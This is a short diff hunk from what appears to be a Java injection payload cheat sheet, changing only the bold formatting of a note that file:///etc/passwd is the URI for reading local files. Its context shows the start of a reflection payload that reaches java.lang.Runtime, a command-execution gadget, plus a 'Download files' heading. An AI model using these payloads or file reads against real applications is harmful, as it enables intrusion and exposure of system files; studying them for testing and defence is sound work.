@@ -69,7 +69,7 @@ new java.lang.String("".class.forName("java.lang.Runtime").getMethod("getRuntime
 ```
 
 ### Notes about files
-**java.net.URI** for working with files on linux is **file:///**etc/passwd 
+**java.net.URI** for working with files on linux is file:///etc/passwd 
 
 ## Download files
 ```java
